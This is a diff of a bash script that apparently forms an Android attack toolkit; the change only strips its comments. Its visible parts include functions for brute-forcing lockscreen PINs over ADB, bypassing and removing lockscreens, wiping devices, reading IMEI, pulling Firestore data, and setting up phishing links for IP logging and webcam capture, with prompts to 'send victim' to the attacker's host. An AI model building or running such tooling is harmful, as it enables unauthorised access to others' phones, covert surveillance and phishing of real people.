@@ -1,12 +1,10 @@
 #!/bin/bash
 
-# Check if script is running as root
 if [ "$(id -u)" != "0" ]; then
     echo "This script must be run as root. Try 'sudo bash $0'" 1>&2
     exit 1
 fi
 
-# Check for ADB and Fastboot
 check_tools() {
     command -v adb >/dev/null 2>&1 || { echo >&2 "ADB is not installed. Installing..."; apt-get install android-tools-adb -y; }
     command -v fastboot >/dev/null 2>&1 || { echo >&2 "Fastboot is not installed. Installing..."; apt-get install android-tools-fastboot -y; }
@@ -14,7 +12,6 @@ check_tools() {
     command -v scrcpy >/dev/null 2>&1 || { echo >&2 "Scrcpy is not installed. Installing..."; apt-get install scrcpy -y; }
 }
 
-# Update system and tools
 update_tools() {
     echo "[+] Updating system and tools..."
     apt-get update && apt-get upgrade -y
@@ -23,7 +20,6 @@ update_tools() {
     echo "[+] Update complete!"
 }
 
-# Brute force 4-digit PIN
 brute_4digit() {
     echo "[!] Works only if: USB Debugging enabled + No lockout policy"
     echo "[!] Most phones lock after 5-10 attempts!"
@@ -38,7 +34,6 @@ brute_4digit() {
     done
 }
 
-# Brute force 6-digit PIN
 brute_6digit() {
     echo "[!] Works only if: USB Debugging enabled + No lockout policy"
     echo "[!] Extremely slow - impractical for real use!"
@@ -53,7 +48,6 @@ brute_6digit() {
     done
 }
 
-# Brute force using wordlist
 brute_wordlist() {
     echo "[!] Requires: USB Debugging enabled + Screen awake"
     read -p "Enter path to wordlist: " wordlist
@@ -70,7 +64,6 @@ brute_wordlist() {
     done < "$wordlist"
 }
 
-# Bypass lockscreen (works on some Android versions)
 bypass_lockscreen() {
     echo "[!] Only works on Android 4.0-7.0 (patched in newer versions)"
     read -p "Continue? (y/n): " confirm
@@ -84,7 +77,6 @@ bypass_lockscreen() {
     echo "[+] If successful, device should be unlocked"
 }
 
-# Attempt to root device with SuperSU
 root_device() {
     echo "[!] WARNING: Most modern phones have secure boot (dm-verity)"
     echo "[!] May brick your device if not compatible!"
@@ -98,7 +90,6 @@ root_device() {
     echo "[+] Please manually flash SuperSU in recovery mode"
 }
 
-# Reset device data (warning: destructive)
 reset_data() {
     echo "[!] THIS WILL WIPE ALL DATA PERMANENTLY!"
     read -p "Confirm wipe? (type 'YES' to continue): " confirm
@@ -114,7 +105,6 @@ reset_data() {
     fi
 }
 
-# Remove lockscreen (requires root)
 remove_lockscreen() {
     echo "[!] Requires: Root access on target device"
     read -p "Continue? (y/n): " confirm
@@ -127,7 +117,6 @@ remove_lockscreen() {
     adb reboot
 }
 
-# IP Logger (create phishing link)
 ip_logger() {
     echo "[!] Requires: Victim must visit your link"
     echo "[+] Setting up IP logger..."
@@ -137,7 +126,6 @@ ip_logger() {
     echo "[+] Send victim to http://$(hostname -I | cut -d' ' -f1)"
 }
 
-# Webcam capture (requires target to visit link)
 webcam_capture() {
     echo "[!] Requires: Victim must visit link + grant permissions"
     echo "[+] Setting up webcam capture..."
@@ -147,7 +135,6 @@ webcam_capture() {
     echo "[+] Send victim to http://$(hostname -I | cut -d' ' -f1):8080"
 }
 
-# Firestore vulnerability check
 firestore_vuln() {
     echo "[!] Most Firestore vulnerabilities patched by Google"
     read -p "Continue? (y/n): " confirm
@@ -159,7 +146,6 @@ firestore_vuln() {
     echo "[+] Firestore data downloaded to /tmp/firestore_data/"
 }
 
-# Get device info
 device_info() {
     echo "[+] Gathering device information..."
     echo "Model: $(adb shell getprop ro.product.model)"
@@ -168,8 +154,7 @@ device_info() {
     echo "Serial Number: $(adb shell getprop ro.serialno)"
     echo "IMEI: $(adb shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print $1}')"
 }
-
-# Main menu and btw this is to display all the options. yeah. 
+ 
 main_menu() {
     clear
     echo "====================================="
@@ -221,7 +206,6 @@ main_menu() {
     main_menu
 }
 
-# ADB Toolkit submenu
 adb_toolkit() {
     clear
     echo "===================="
@@ -259,6 +243,5 @@ adb_toolkit() {
     adb_toolkit
 }
 
-# Initialize
 check_tools
 main_menu
